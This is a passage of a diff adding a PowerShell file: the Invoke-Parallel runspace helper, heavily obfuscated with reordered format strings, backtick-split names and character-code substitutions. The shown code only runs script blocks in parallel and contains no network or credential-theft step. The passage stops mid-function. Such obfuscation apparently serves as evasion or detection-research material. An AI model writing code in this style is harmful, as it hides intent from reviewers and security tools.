@@ -1,0 +1,411 @@
+sEt-iTem  ("{0}{3}{2}{1}"-f 'v','37J','IaBlE:wZ0','AR')  ([type]("{1}{0}" -f 'tH','ma')); SeT-VAriABLe  ("{0}{1}"-f 'H','4S')  (  [TYPe]("{0}{1}"-f 'TUPL','E')) ;   Set  ("{0}{1}"-f '0Qk','Z1p')  ([TyPe]("{1}{0}{2}" -F'riptbL','sC','OCK')); ${Kw`ZF`68} = [tYpE]("{9}{1}{11}{15}{4}{17}{16}{5}{8}{2}{14}{3}{10}{12}{6}{13}{0}{7}" -F 'nS','.ManA','UNSP','E','nt.a','o','nITiaLS','TatE','N.R','sySTEM','s','g','.i','EsSio','ac','eme','I','UToMaT')  ;    SET  ("zj"+"B2")  ([tyPE]("{0}{1}{2}" -f 'r','UNsPAc','eFaCTory') ); sET-vARiabLe  ("{0}{1}"-f'vU','xM') ([TYpe]("{2}{1}{0}{3}"-F 'h','oWeRs','p','ELL')  )  ;   set-vARIAbLe ('Ys'+'0')  (  [tYpE]('Gc'));function in`VOKe`-PARAl`lel {
+    
+    [cmdletbinding(defaulTpArAmeteRSEtNAme={"{2}{1}{0}"-f'k','c','ScriptBlo'})]
+    Param (
+        [Parameter(MaNdatOry=${fAl`sE},poSITION=0,PARAmeterSEtnAME="sc`RIP`TblOck")]
+        [System.Management.Automation.ScriptBlock]${Scr`iP`T`BloCk},
+
+        [Parameter(MANdaTory=${f`ALSE},PArAmETERSETnAme="scR`i`pTf`ILe")]
+        [ValidateScript({&("{3}{1}{0}{2}" -f'-P','st','ath','Te') ${_} -pathtype ("{1}{0}"-f'f','lea')})]
+        ${SC`RIp`TFIlE},
+
+        [Parameter(ManDAtoRy=${tR`Ue},VaLuEfRomPIpelinE=${t`Rue})]
+        [Alias('CN',{"{0}{1}"-f '__','Server'},{"{1}{2}{0}"-f 's','IPAddre','s'},{"{1}{0}" -f'er','Serv'},{"{0}{1}{2}{3}"-f'Computer','N','am','e'})]
+        [PSObject]${inP`UTO`BJeCT},
+
+        [PSObject]${pArAM`ET`ER},
+
+        [switch]${iM`PoR`T`VAR`IAblEs},
+        [switch]${Im`PORtM`oDUl`eS},
+        [switch]${IMPOR`T`Fu`NCTioNS},
+
+        [int]${t`hrOT`TLe} = 20,
+        [int]${sLEe`Pt`iMEr} = 200,
+        [int]${RUN`S`Pa`ceTi`me`ouT} = 0,
+        [switch]${nOClose`oNt`ImEo`UT} = ${f`AL`Se},
+        [int]${M`AxQU`euE},
+
+        [validatescript({&("{1}{0}" -f 'st-Path','Te') (&("{2}{0}{1}" -f 'it-','Path','Spl') ${_} -parent)})]
+        [switch] ${A`Ppe`N`dLog} = ${fa`l`sE},
+        [string]${l`ogfi`lE},
+
+        [switch] ${Qui`Et} = ${f`A`LSe}
+    )
+    begin {
+        
+        
+        if( -not ${PSbO`UND`paR`AMEteRs}.("{0}{2}{1}"-f'C','tainsKey','on').Invoke(("{2}{1}{0}" -f'ueue','Q','Max')) ) {
+            if(${R`U`N`spAceTimeo`Ut} -ne 0){ ${Sc`R`IPt:maxQ`UE`Ue} = ${THRot`T`LE} }
+            else{ ${SCRiP`T:`mAxqUeUE} = ${tHroT`Tle} * 3 }
+        }
+        else {
+            ${s`crIpT:`MaX`Q`UEUE} = ${Ma`xqueuE}
+        }
+        ${p`RoGr`Essid} = &("{3}{1}{2}{0}"-f'om','Ran','d','Get-')
+        &("{0}{1}{3}{2}"-f 'Wr','ite-V','rbose','e') ('Throt'+'tl'+'e: '+"'$throttle' "+'Slee'+'pTime'+'r '+"'$sleepTimer' "+'run'+'SpaceTimeo'+'u'+'t'+' '+"'$runspaceTimeout' "+'ma'+'xQu'+'eue '+"'$maxQueue' "+'log'+'File '+"'$logFile'")
+
+        
+        if (${i`MpO`RTva`RIaB`LEs} -or ${I`Mpo`RT`ModULeS} -or ${i`mPO`RT`Func`Tions}) {
+            ${S`TAN`dARDusE`ReNV} =   (  iTEm ("{1}{2}{0}{3}"-f 'ab','Var','I','Le:VUxM'))."VAl`UE"::("{0}{1}" -f'Cr','eate').Invoke().("{0}{1}{2}" -f'adds','cri','pt').Invoke({
+
+                
+                ${MO`dUl`Es} = &("{2}{0}{1}" -f'et-M','odule','G') | &("{1}{0}{2}{3}"-f'ect-Obj','Sel','e','ct') -ExpandProperty ("{0}{1}" -f'N','ame')
+                ${S`NAP`Ins} = &("{1}{0}{2}" -f 't-PSSna','Ge','pin') | &("{0}{1}{3}{2}"-f'S','elec','Object','t-') -ExpandProperty ("{1}{0}"-f 'me','Na')
+                ${fuNCtI`O`NS} = &("{0}{3}{2}{1}"-f'G','tem','ChildI','et-') ((("{2}{1}{3}{0}"-f'F','un','f','ction:hu'))-CRePlAce  ([ChaR]104+[ChaR]117+[ChaR]70),[ChaR]92) | &("{2}{1}{0}"-f 't','ect-Objec','Sel') -ExpandProperty ("{0}{1}"-f'Na','me')
+
+                
+                
+                ${vA`RiaBl`Es} = &("{2}{0}{3}{1}" -f '-V','riable','Get','a') | &("{2}{1}{3}{0}"-f'bject','ect-','Sel','O') -ExpandProperty ("{1}{0}"-f 'ame','N')
+
+                
+                @{
+                    ("{0}{1}{2}"-f'V','ariab','les')   = ${V`Aria`BleS}
+                    ("{2}{0}{1}"-f'odu','les','M')     = ${M`OD`ULES}
+                    ("{0}{1}" -f 'Snapin','s')     = ${s`NA`PInS}
+                    ("{2}{0}{1}"-f 'u','nctions','F')   = ${f`UN`c`TIoNS}
+                }
+            })."InVo`KE"()[0]
+
+            if (${i`Mp`Or`TVaR`IaBlES}) {
+                
+                Function _`TemP {[cmdletbinding(supPorTSSHOUldPRocEss=${T`RUE})] param() }
+                ${vaRIAbl`E`stO`ex`cLUDe} = @( (&("{2}{0}{1}"-f't','-Command','Ge') ("{0}{1}" -f'_te','mp') | &("{1}{2}{0}"-f 'ct','Sel','ect-Obje') -ExpandProperty ("{2}{0}{1}"-f 'aram','eters','p'))."K`eys" + ${P`sBO`UN`dpaRam`ETe`Rs}."K`EYs" + ${s`T`ANDAR`DUseRe`Nv}."V`ArIa`BLES" )
+                &("{1}{0}{2}{3}"-f'-','Write','Verbos','e') "Excluding variables $( ($VariablesToExclude | Sort-Object ) -join ", ") "
+
+                
+                
+                
+                
+                ${use`Rvari`ABl`ES} = @( &("{3}{0}{2}{1}" -f'ia','e','bl','Get-Var') | &("{1}{0}{3}{2}" -f 'her','W','bject','e-O') { -not (${varIa`BL`ESToe`xCluDe} -contains ${_}."NA`mE") } )
+                &("{1}{2}{0}" -f 'ose','Wr','ite-Verb') "Found variables to import: $( ($UserVariables | Select-Object -expandproperty Name | Sort-Object ) -join ", " | Out-String).`n "
+            }
+            if (${IMp`o`RTmo`D`ULes}) {
+                ${u`se`RMOduleS} = @( &("{2}{0}{1}" -f 't-Mo','dule','Ge') | &("{3}{2}{1}{0}" -f'ect','re-Obj','he','W') {${STA`N`D`AR`du`sErEnv}."m`OduL`ES" -notcontains ${_}."na`me" -and (&("{1}{2}{0}"-f 'ath','Tes','t-P') ${_}."p`ATh" -ErrorAction ("{1}{2}{3}{0}{4}"-f'nu','Sile','ntly','Conti','e'))} | &("{2}{0}{1}" -f 'ect-Obj','ect','Sel') -ExpandProperty ("{0}{1}"-f 'P','ath') )
+                ${USErSn`AP`inS} = @( &("{0}{1}{2}{3}"-f'Ge','t-P','SSnapi','n') | &("{1}{0}{2}{3}" -f'b','Select-O','j','ect') -ExpandProperty ("{0}{1}"-f 'N','ame') | &("{3}{2}{0}{1}" -f '-','Object','here','W') {${sTA`NDA`RdUS`ER`Env}."SnA`P`Ins" -notcontains ${_} } )
+            }
+            if(${IMPO`Rtfun`cT`IoNS}) {
+                ${U`SeRf`U`NCtions} = @( &("{4}{0}{2}{1}{3}" -f 't-','It','Child','em','Ge') (("{2}{0}{1}" -f'unction',':qVJ','f'))."r`eP`LaCE"(([chaR]113+[chaR]86+[chaR]74),'\') | &("{3}{1}{2}{0}" -f'ct','ere','-Obje','Wh') { ${StA`NDa`R`du`sErENV}."Func`Ti`ONS" -notcontains ${_}."N`Ame" } )
+            }
+        }
+
+        
+            Function gE`T-ruN`S`pAceDA`TA {
+                [cmdletbinding()]
+                param( [switch]${WA`IT} )
+                
+                
+                Do {
+                    
+                    ${MO`RE} = ${f`ALSE}
+
+                    
+                    if (-not ${qu`iEt}) {
+                        &("{2}{0}{1}" -f'rite-Progr','ess','W') -Id ${pr`OgRESS`Id} -Activity ("{3}{2}{1}{0}"-f'y','r','g Que','Runnin') -Status ("{1}{3}{0}{2}"-f'ting thr','Sta','eads','r')`
+                            -CurrentOperation ("$startedCount "+'thr'+'eads '+'defin'+'ed '+'- '+"$totalCount "+'inpu'+'t'+' '+'o'+'bject'+'s '+'- '+"$script:completedCount "+'inpu'+'t '+'obje'+'ct'+'s '+'pr'+'ocesse'+'d')`
+                            -PercentComplete $( Try { ${ScrIpT`:`coM`p`LeTeDcOunt} / ${t`otalCOu`NT} * 100 } Catch {0} )
+                    }
+
+                    
+                    Foreach(${Ru`N`sp`Ace} in ${RUn`S`pACEs}) {
+
+                        
+                        ${C`UrReN`T`date} = &("{0}{2}{1}" -f 'Get-','e','Dat')
+                        ${ruNT`imE} = ${cuRr`e`NTD`ATe} - ${rUn`SPACE}."sTARTti`ME"
+                        ${RU`N`MiN} =  ${wz03`7J}::("{1}{0}"-f'und','Ro').Invoke( ${runti`me}."TO`TaLM`iN`UTeS" ,2 )
+
+                        
+                        ${L`oG} = "" | &("{2}{1}{0}{3}"-f 'c','je','Select-Ob','t') ("{0}{1}"-f'D','ate'), ("{0}{2}{1}" -f 'Ac','n','tio'), ("{1}{0}"-f 'untime','R'), ("{0}{1}" -f'Stat','us'), ("{0}{1}"-f'Deta','ils')
+                        ${L`oG}."A`cTi`on" = "Removing:'$($runspace.object)'"
+                        ${l`Og}."Da`Te" = ${CURr`En`TDATE}
+                        ${L`OG}."RU`NtI`me" = ("$runMin "+'min'+'utes')
+
+                        
+                        If (${r`U`N`sPACe}."r`UnSpACE"."IscO`MpLe`T`Ed") {
+
+                            ${SCRI`pT:`c`O`MPLeT`edcouNT}++
+
+                            
+                            if(${RUNs`PA`cE}."pO`wersh`ELL"."sT`REAmS"."E`RroR"."c`OUNT" -gt 0) {
+                                
+                                ${l`og}."s`TaT`Us" = ("{2}{1}{0}{4}{3}" -f 'etedWith','pl','Com','s','Error')
+                                &("{3}{1}{2}{0}" -f'-Verbose','t','e','Wri') (${L`OG} | &("{2}{1}{0}"-f 'rtTo-Csv','onve','C') -Delimiter ";" -NoTypeInformation)[1]
+                                foreach(${E`Rro`RReCord} in ${R`UnSp`ACE}."PoW`e`RShEll"."ST`R`eaMS"."ER`Ror") {
+                                    &("{2}{0}{1}" -f'i','te-Error','Wr') -ErrorRecord ${ER`RoR`R`ECOrd}
+                                }
+                            }
+                            else {
+                                
+                                ${L`OG}."st`AtUs" = ("{2}{1}{0}" -f 'ted','ple','Com')
+                                &("{1}{2}{0}{3}{4}" -f'e-','Wri','t','Ver','bose') (${l`Og} | &("{4}{2}{0}{3}{1}"-f'-','v','o','Cs','ConvertT') -Delimiter ";" -NoTypeInformation)[1]
+                            }
+
+                            
+                            ${RunS`paCE}."po`w`ERSHE`LL".("{1}{0}{2}" -f 'Invok','End','e').Invoke(${rUnsP`A`CE}."RuNs`PA`ce")
+                            ${r`UN`spAce}."pO`We`RSHe`ll".("{2}{0}{1}" -f'pos','e','dis').Invoke()
+                            ${RUnS`P`ACE}."RUN`SPACe" = ${Nu`ll}
+                            ${runs`pa`Ce}."poW`ERSH`ell" = ${Nu`LL}
+                        }
+                        
+                        ElseIf ( ${RU`Ns`P`ACETi`Me`ouT} -ne 0 -and ${RuN`T`Ime}."t`Ota`LSe`Conds" -gt ${rU`NspA`Cetim`Eout}) {
+                            ${scrIpT:`cO`MP`LEtedC`O`U`NT}++
+                            ${tiMeDO`Utt`A`s`Ks} = ${t`RUe}
+
+                            
+                            ${l`oG}."sT`At`US" = ("{1}{0}" -f'Out','Timed')
+                            &("{1}{0}{2}"-f'rit','W','e-Verbose') (${L`oG} | &("{2}{3}{4}{0}{1}"-f'o-C','sv','C','onv','ertT') -Delimiter ";" -NoTypeInformation)[1]
+                            &("{0}{3}{1}{2}"-f'Write-','r','or','Er') "Runspace timed out at $($runtime.totalseconds) seconds for the object:`n$($runspace.object | out-string) "
+
+                            
+                            if (!${nOcLO`se`oNtim`EoUT}) { ${RUnSP`ACe}."Pow`ers`He`Ll".("{1}{0}" -f'se','dispo').Invoke() }
+                            ${R`Un`SP`ACe}."runsp`AcE" = ${nu`Ll}
+                            ${R`U`NsPa`ce}."PO`WERsHE`Ll" = ${N`ULL}
+                            ${C`o`m`P`leTEDCOunT}++
+                        }
+
+                        
+                        ElseIf (${RuN`Spa`cE}."RUnsp`AcE" -ne ${NU`lL} ) {
+                            ${L`oG} = ${Nu`lL}
+                            ${mo`RE} = ${T`RuE}
+                        }
+
+                        
+                        if(${LOGF`ilE} -and ${L`OG}) {
+                            (${l`OG} | &("{2}{0}{1}" -f'v','ertTo-Csv','Con') -Delimiter ";" -NoTypeInformation)[1] | &("{0}{2}{1}"-f'o','t-file','u') ${L`o`gfILE} -append
+                        }
+                    }
+
+                    
+                    ${tE`mP`HASh} = ${r`U`NS`PacEs}.("{1}{0}"-f 'lone','c').Invoke()
+                    ${teM`Pha`sh} | &("{1}{2}{0}"-f'ect','Wh','ere-Obj') { ${_}."RuNsP`Ace" -eq ${N`Ull} } | &("{2}{3}{4}{1}{0}" -f 'ject','b','F','orEa','ch-O') {
+                        ${ru`NspAc`ES}.("{2}{1}{0}" -f've','emo','r').Invoke(${_})
+                    }
+
+                    
+                    if(${ps`BOun`dpaRa`Me`TERs}[("{1}{0}" -f'it','Wa')]){ &("{2}{0}{1}"-f 'r','t-Sleep','Sta') -milliseconds ${S`LE`epTIMEr} }
+
+                
+                } while (${mO`Re} -and ${p`sBoU`N`dPAR`Am`eters}[("{1}{0}" -f't','Wai')])
+
+            
+            }
+        
+
+        
+
+            if(${ps`C`MdLET}.pArAmeTErSetNAmE -eq ("{1}{0}{2}{3}" -f 'riptFi','Sc','l','e')) {
+                ${SCRI`PTB`LO`Ck} =  (  gcI  ("{3}{0}{1}{2}" -f 'aRIABlE:0q','k','Z1P','v') )."Va`LUe"::("{1}{0}" -f 'eate','Cr').Invoke( $(&("{0}{2}{1}" -f 'Get','nt','-Conte') ${sCript`Fi`le} | &("{0}{1}{3}{2}"-f 'o','ut-','g','strin')) )
+            }
+            elseif(${p`S`CmDL`Et}.paraMETersetNamE -eq ("{2}{0}{3}{1}"-f 'r','lock','Sc','iptB')) {
+                
+                [string[]]${p`Ara`MstOADd} = '$_'
+                if( ${PSBou`ND`pARA`meters}.("{3}{2}{0}{1}" -f'in','sKey','ta','Con').Invoke(("{0}{1}{2}" -f 'P','aram','eter')) ) {
+                    ${ParAmsT`O`ADD} += ((('QKkPa'+'rame'+'ter')  -crePlACe  ([ChaR]81+[ChaR]75+[ChaR]107),[ChaR]36))
+                }
+
+                ${us`INGv`ARi`AB`lEdaTa} = ${N`ULL}
+
+                
+                
+
+                if(${P`s`VeRsIONTA`BLe}."pSv`ersI`ON"."maJ`OR" -gt 2) {
+                    
+                    ${u`siNgVaR`Ia`BlES} = ${SCriP`T`BLo`ck}."a`st"."FIn`dA`LL"({${AR`gs}[0] -is [System.Management.Automation.Language.UsingExpressionAst]},${T`Rue})
+
+                    If (${U`siNg`VArIa`Bles}) {
+                        ${L`IST} = &("{0}{1}{2}" -f'Ne','w-Objec','t') (('Sys'+'tem'+'.'+'Col'+'lections.Generi'+'c.'+'Lists'+'Ay1[S'+'yst'+'em.Mana'+'g'+'ement.Auto'+'mat'+'i'+'on'+'.'+'L'+'ang'+'u'+'age'+'.Va'+'r'+'iabl'+'eE'+'xpres'+'s'+'ionAst]')."r`EpLace"('sAy',[STrING][cHaR]96))
+                        ForEach (${A`St} in ${uSi`Ng`VA`RIaBLeS}) {
+                            [void]${Li`ST}.("{1}{0}"-f 'd','Ad').Invoke(${A`ST}."SUbEx`PrE`SS`i`on")
+                        }
+
+                        ${US`iN`GVar} = ${U`sING`Va`RI`Ables} | &("{1}{0}{2}" -f'oup-Objec','Gr','t') -Property ("{3}{0}{2}{1}"-f'bExpres','on','si','Su') | &("{2}{0}{1}{3}"-f 'orEa','ch-Obj','F','ect') {${_}."gRo`Up" | &("{1}{0}{2}" -f'ect-Obje','Sel','ct') -First 1}
+
+                        
+                        ${U`sINGV`ArI`ABL`EData} = ForEach (${V`AR} in ${u`siNG`VaR}) {
+                            try {
+                                ${VAl`UE} = &("{0}{1}{2}{3}"-f'Ge','t-V','ariabl','e') -Name ${v`Ar}."subExP`R`ESSIOn"."VARia`B`LePath"."Use`Rp`ATH" -ErrorAction ("{1}{0}"-f'p','Sto')
+                                [pscustomobject]@{
+                                    ("{1}{0}"-f'ame','N') = ${v`AR}."S`UbexPrE`Ssi`oN"."e`XT`eNT"."t`ExT"
+                                    ("{0}{1}" -f 'Val','ue') = ${v`AluE}."Val`Ue"
+                                    ("{2}{0}{1}"-f'Na','me','New') = ('$__using_{0}' -f ${V`Ar}."SuBeX`PReS`SIOn"."vAR`ia`BlEpatH"."Us`erPa`Th")
+                                    ("{0}{2}{1}"-f'NewVa','me','rNa') = ('__using_{0}' -f ${v`AR}."suBeXpR`ESs`i`oN"."VARiA`BlEP`A`TH"."u`SErpA`TH")
+                                }
+                            }
+                            catch {
+                                &("{0}{1}{3}{2}"-f'Writ','e','Error','-') "$($Var.SubExpression.Extent.Text) is not a valid Using: variable! "
+                            }
+                        }
+                        ${parAMs`TO`A`dD} += ${usiNgVa`Ri`A`BLEda`TA} | &("{2}{1}{3}{0}" -f 't','ect-','Sel','Objec') -ExpandProperty ("{1}{0}"-f'Name','New') -Unique
+
+                        ${N`EwP`AraMs} = ${usIN`GVArI`Ab`LE`DA`TA}."n`EWN`AmE" -join ', '
+                        ${Tup`lE} =  ( vArIablE  ("{0}{1}"-f'h','4S') -VaLuEOn  )::("{0}{2}{1}" -f 'Cre','te','a').Invoke(${li`St}, ${NewPaR`A`ms})
+                        ${bind`INg`FlAgs} = [Reflection.BindingFlags]("{5}{1}{3}{6}{2}{0}{4}" -f'c','f','stan','ault,Non','e','De','Public,In')
+                        ${g`etWI`T`h`iN`p`UtHaNDLin`gfoRi`NV`OKE`cOMmAN`DiMPL} = (${sC`RiPtbL`OcK}."a`ST".("{0}{1}{2}" -f 'ge','tt','ype').Invoke().("{0}{1}{2}"-f'GetMeth','o','d').Invoke(("{9}{3}{6}{5}{1}{8}{0}{11}{10}{2}{4}{7}"-f 'n','tHa','InvokeCom','et','mandI','u','WithInp','mpl','ndli','G','r','gFo'),${Bi`N`diNg`FLA`gs}))
+
+                        ${stRi`NGsC`R`IptB`LoCk} = ${g`EtwiThIn`puth`AnD`lINGForInvOkeComm`A`ND`iMPL}."I`Nv`oKE"(${SC`RIPTb`l`OCK}."a`ST",@(${tu`PLE}))
+
+                        ${Sc`RIpT`BLO`CK} =  ${0q`kz1P}::("{1}{0}" -f 'eate','Cr').Invoke(${StRIngS`cr`IpT`BlOcK})
+
+                        &("{3}{1}{2}{0}"-f'e','e-','Verbos','Writ') ${STringS`C`Ri`ptbLo`cK}
+                    }
+                }
+
+                ${scRi`ptbL`o`CK} = ${e`XEC`UTIOn`Con`Text}."INV`oK`E`CoMM`AND".("{0}{1}{3}{2}"-f 'Ne','wS','ock','criptBl').Invoke("param($($ParamsToAdd -Join ", "))`r`n " + ${Sc`RIpT`B`LOcK}.("{2}{0}{1}"-f'oStrin','g','T').Invoke())
+            }
+            else {
+                Throw ("{3}{5}{0}{6}{8}{7}{4}{1}{2}" -f'r',' Script','File','Must ','ock or','p','ovide ','criptBl','S'); Break
+            }
+
+            &("{0}{3}{2}{1}"-f'Wr','ebug','e-D','it') "`$ScriptBlock: $($ScriptBlock | Out-String) "
+            &("{3}{1}{2}{0}"-f'rbose','e-','Ve','Writ') ("{8}{6}{9}{5}{3}{11}{1}{2}{7}{0}{10}{4}" -f'on s',' ','ses',' pool','es','unspace','reatin','si','C','g r','tat',' and')
+
+            
+            ${SESSiON`STA`TE} =   ${K`Wzf`68}::("{2}{1}{0}"-f 'teDefault','ea','Cr').Invoke()
+            if(${I`Mpo`RTvar`iABLES} -and ${Use`R`Va`R`iAbles}."c`OuNT" -gt 0) {
+                foreach(${Va`RiaBle} in ${u`sE`RvarI`Ab`lEs}) {
+                    ${seS`S`iONS`TaTe}."var`I`AbLES".("{1}{0}" -f 'd','Ad').Invoke((&("{0}{2}{3}{1}"-f 'N','ct','ew-O','bje') -TypeName ("{1}{9}{4}{7}{2}{11}{3}{6}{5}{8}{13}{0}{12}{10}" -f'b','System.M','Aut','ion.Runs','gement','e','pac','.','s.SessionSt','ana','try','omat','leEn','ateVaria') -ArgumentList ${va`RI`Able}."Na`me", ${VARI`AblE}."Va`LUE", ${Nu`Ll}) )
+                }
+            }
+            if (${impOrTmo`du`L`eS}) {
+                if(${u`SErMOd`UleS}."C`ouNt" -gt 0) {
+                    foreach(${Mo`d`ULePATh} in ${u`seRmODU`l`ES}) {
+                        ${s`e`S`siOnS`Tate}.("{0}{2}{1}{3}"-f'Imp','od','ortPSM','ule').Invoke(${mOdU`l`ePaTH})
+                    }
+                }
+                if(${UserSN`A`PIns}."coU`NT" -gt 0) {
+                    foreach(${psSN`Ap`iN} in ${U`S`ErSnApiNs}) {
+                        [void]${ses`si`oNstATe}."i`Mportp`sSNaPIn"(${p`sS`NAPin}, [ref]${nu`lL})
+                    }
+                }
+            }
+            if(${i`mP`OrtF`UncT`ioNS} -and ${Use`RFunctI`OnS}."C`Ount" -gt 0) {
+                foreach (${FU`NctIO`NDeF} in ${us`ERf`UNc`T`Ions}) {
+                    ${SESS`IO`NStATe}."C`o`mmandS".("{1}{0}"-f 'd','Ad').Invoke((&("{1}{0}{2}" -f'w','Ne','-Object') ("{10}{11}{4}{6}{3}{9}{8}{0}{1}{12}{2}{7}{5}{13}" -f 'spaces','.','essio','m','u','FunctionEnt','to','nState','un','ation.R','Syste','m.Management.A','S','ry') -ArgumentList ${FuNc`T`iOn`DEF}."n`AmE",${F`U`NcTIOND`Ef}."SC`R`IPtbLoCk"))
+                }
+            }
+
+            
+            ${rUnSPa`c`e`POOL} =   (GeT-VAriAble  ("Zj"+"b2"))."Val`Ue"::("{1}{0}{4}{2}{3}" -f'reat','C','unspace','Pool','eR').Invoke(1, ${tHRO`Tt`LE}, ${seSs`ioN`s`TaTE}, ${h`ost})
+            ${RU`NsP`ACEpOoL}.("{1}{0}" -f 'n','Ope').Invoke()
+
+            &("{1}{0}{3}{2}"-f'i','Wr','e-Verbose','t') ("{0}{9}{14}{8}{5}{3}{10}{7}{2}{6}{11}{4}{12}{13}{1}"-f 'C','bs',' c','mp',' hold run','ng e','olle','y','ti','r','t','ction to','space',' jo','ea')
+            ${sCr`I`Pt:Ru`N`SPA`Ces} = &("{1}{2}{3}{0}"-f 'ject','Ne','w','-Ob') ("{6}{3}{2}{0}{4}{7}{5}{1}"-f 'ollections.','t','stem.C','y','A','s','S','rrayLi')
+
+            
+            ${b`oUnd} = ${p`SBOUN`DPAr`AM`ETE`Rs}."k`eYs" -contains ("{1}{0}{2}"-f 'put','In','Object')
+            if(-not ${b`OU`Nd}) {
+                [System.Collections.ArrayList]${all`ObJE`cts} = @()
+            }
+
+            
+            if( ${l`OGf`iLe} -and (-not (&("{2}{0}{1}"-f 'Pa','th','Test-') ${L`ogFILe}) -or ${A`PP`EnDLoG} -eq ${faL`Se})){
+                &("{0}{1}" -f'N','ew-Item') -ItemType ("{0}{1}"-f 'fil','e') -Path ${lO`G`File} -Force | &("{0}{2}{1}" -f 'Out-','ll','Nu')
+                ("" | &("{1}{2}{0}{3}" -f'ect-Ob','Se','l','ject') -Property ("{0}{1}"-f 'Da','te'), ("{0}{1}"-f 'Actio','n'), ("{0}{1}"-f 'Runtim','e'), ("{0}{1}"-f 'Sta','tus'), ("{0}{1}" -f'Det','ails') | &("{2}{3}{4}{1}{0}"-f'v','Cs','C','onver','tTo-') -NoTypeInformation -Delimiter ";")[0] | &("{0}{1}" -f'Out-Fi','le') ${LogF`ILe}
+            }
+
+            
+            ${L`Og} = "" | &("{0}{2}{1}" -f 'Sele','ect','ct-Obj') -Property ("{1}{0}" -f 'te','Da'), ("{1}{0}"-f'n','Actio'), ("{1}{0}{2}" -f 'unti','R','me'), ("{0}{1}" -f 'Sta','tus'), ("{0}{2}{1}"-f 'De','s','tail')
+                ${l`oG}."D`ATE" = &("{0}{1}"-f 'G','et-Date')
+                ${l`OG}."act`iOn" = ("{6}{3}{4}{0}{5}{1}{2}" -f 'si','start','ed','tch pro','ces','ng ','Ba')
+                ${L`og}."ru`NtIME" = ${NU`ll}
+                ${l`Og}."StA`TuS" = ("{2}{1}{0}"-f'ted','tar','S')
+                ${L`OG}."de`TAi`lS" = ${nU`lL}
+                if(${LoG`File}) {
+                    (${L`oG} | &("{0}{1}{2}"-f'con','ver','tto-csv') -Delimiter ";" -NoTypeInformation)[1] | &("{1}{0}{2}"-f't','Ou','-File') ${l`OgF`Ile} -Append
+                }
+            ${Ti`med`OUTtaS`KS} = ${fA`lsE}
+        
+    }
+    process {
+        
+        if(${B`o`UNd}) {
+            ${all`oBjE`CTs} = ${IN`p`UT`OBJeCt}
+        }
+        else {
+            [void]${AllobJ`e`CTS}.("{0}{1}" -f 'ad','d').Invoke( ${iNpu`To`BJECT} )
+        }
+    }
+    end {
+        
+        try {
+            
+            ${TOTaLc`oU`Nt} = ${alLO`Bj`ecTS}."c`ount"
+            ${SCrI`PT:Co`MPLEteDc`oU`NT} = 0
+            ${S`T`ARTedCo`UNT} = 0
+            foreach(${OBj`Ect} in ${A`lloBJe`c`Ts}) {
+                
+                    
+                    ${pOweR`S`h`elL} =  ${vu`xm}::("{1}{0}" -f'reate','C').Invoke()
+
+                    if (${V`eR`BOSEpReFe`Re`Nce} -eq ("{1}{0}" -f'ontinue','C')) {
+                        [void]${P`owE`Rs`HElL}.("{1}{2}{0}"-f 'ript','A','ddSc').Invoke({${veR`B`O`sEpRefEReNCe} = ("{0}{1}" -f'Conti','nue')})
+                    }
+
+                    [void]${PO`WerS`He`lL}.("{1}{0}{2}" -f 'p','AddScri','t').Invoke(${sC`RIPtb`Lo`Ck}).("{0}{1}{2}"-f'AddA','r','gument').Invoke(${Ob`JECT})
+
+                    if (${pa`RaM`e`TeR}) {
+                        [void]${powe`RSh`ell}.("{3}{1}{0}{2}" -f'rgume','ddA','nt','A').Invoke(${p`ARAme`T`er})
+                    }
+
+                    
+                    if (${u`SingV`ArIaB`L`ED`AtA}) {
+                        Foreach(${US`in`gvaRIaBLE} in ${Using`VAriAb`LE`data}) {
+                            &("{0}{3}{2}{1}"-f'Writ','ose','Verb','e-') "Adding $($UsingVariable.Name) with value: $($UsingVariable.Value) "
+                            [void]${pOw`erSh`E`ll}.("{1}{2}{0}" -f 'ent','A','ddArgum').Invoke(${U`Si`N`gVAr`IabLe}."vaL`UE")
+                        }
+                    }
+
+                    
+                    ${p`OW`ER`sHeLL}."rUNSP`A`c`EpoOL" = ${RUNS`paC`e`pool}
+
+                    
+                    ${t`EmP} = "" | &("{0}{1}{2}{3}"-f'S','elect-','Objec','t') ("{0}{1}{2}" -f'Po','werS','hell'), ("{1}{2}{0}"-f'ime','S','tartT'), ("{1}{0}{2}"-f'bj','o','ect'), ("{0}{1}" -f 'Ru','nspace')
+                    ${te`mp}."Pow`ers`Hell" = ${PoweR`ShE`lL}
+                    ${tE`Mp}."sT`A`RtTime" = &("{0}{2}{1}"-f'Ge','e','t-Dat')
+                    ${Te`mP}."obJE`Ct" = ${oBJ`eCt}
+
+                    
+                    ${tE`Mp}."r`UnS`pAce" = ${p`o`weRShEll}.("{0}{3}{2}{1}" -f 'Be','nvoke','nI','gi').Invoke()
+                    ${Sta`RtE`DcOunt}++
+
+                    
+                    &("{1}{2}{0}{3}{4}" -f'Ve','Writ','e-','rb','ose') ( "Adding {0} to collection at {1}" -f ${t`eMp}."Obj`ECt", ${Te`mp}."s`Tartt`IMe".("{0}{2}{1}" -f't','ing','ostr').Invoke() )
+                    ${R`U`Nspa`Ces}.("{0}{1}" -f 'A','dd').Invoke(${tE`mP}) | &("{0}{2}{1}" -f 'Ou','-Null','t')
+
+                    
+                    &("{0}{3}{1}{2}{4}" -f 'Get-','pac','eDa','Runs','ta')
+
+                    
+                    
+                    ${FIrS`T`RUN} = ${Tr`UE}
+                    while (${R`U`NsPACes}."C`ouNt" -ge ${sCrip`T:`MaX`QU`EUe}) {
+                        
+                        if(${F`irs`TrUn}) {
+                            &("{1}{0}{2}"-f'te-Verbo','Wri','se') "$($runspaces.count) items running - exceeded $Script:MaxQueue limit. "
+                        }
+                        ${fiRS`Trun} = ${f`ALSe}
+
+                        
+                        &("{4}{3}{0}{1}{5}{2}" -f'-R','unspace','ata','et','G','D')
+                        &("{3}{2}{0}{1}"-f 't-Sl','eep','r','Sta') -Milliseconds ${SleEpT`IM`er}
+                    }
+                
+            }
+            &("{0}{2}{1}{3}"-f'Write','bo','-Ver','se') ( "Finish processing the remaining runspace jobs: {0}" -f ( @(${r`U`NspAcES} | &("{0}{1}{2}"-f 'Where','-Obje','ct') {${_}."RU`NspaCE" -ne ${n`UlL}})."cOU`Nt") )
+
+            &("{2}{0}{1}{4}{3}" -f 'unsp','ac','Get-R','ta','eDa') -wait
+            if (-not ${Q`UIeT}) {
